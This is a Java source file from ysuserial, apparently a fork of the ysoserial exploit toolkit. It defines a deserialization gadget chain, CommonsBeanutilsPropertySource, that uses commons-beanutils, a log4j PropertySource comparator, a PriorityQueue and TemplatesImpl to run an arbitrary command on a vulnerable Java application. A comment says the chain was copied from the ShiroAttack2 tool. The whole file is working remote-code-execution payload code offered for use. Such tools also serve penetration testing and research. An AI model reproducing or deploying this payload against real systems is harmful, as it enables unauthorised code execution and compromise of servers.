package org.su18.ysuserial.payloads;

import org.apache.commons.beanutils.BeanComparator;
import org.apache.logging.log4j.util.PropertySource;
import org.su18.ysuserial.payloads.annotation.Authors;
import org.su18.ysuserial.payloads.annotation.Dependencies;
import org.su18.ysuserial.payloads.util.Gadgets;
import org.su18.ysuserial.payloads.util.Reflections;

import java.util.PriorityQueue;

/**
 * 从 https://github.com/SummerSec/ShiroAttack2/ 中抄来的链子
 *
 * @author su18
 */
@Dependencies({"commons-beanutils:commons-beanutils:1.9.2", "org.apache.logging.log4j:log4j-core:2.17.1"})
@Authors({"SummerSec"})
public class CommonsBeanutilsPropertySource implements ObjectPayload<Object> {

	@Override
	public Object getObject(String command) throws Exception {

		final Object template = Gadgets.createTemplatesImpl(command);
		PropertySource propertySource1 = new PropertySource() {
			@Override
			public int getPriority() {
				return 0;
			}
		};

		BeanComparator beanComparator = new BeanComparator(null, new PropertySource.Comparator());

		PriorityQueue<Object> queue = new PriorityQueue<Object>(2, beanComparator);

		queue.add(propertySource1);
		queue.add(propertySource1);

		Reflections.setFieldValue(queue, "queue", new Object[]{template, template});
		Reflections.setFieldValue(beanComparator, "property", "outputProperties");

		return queue;
	}

}
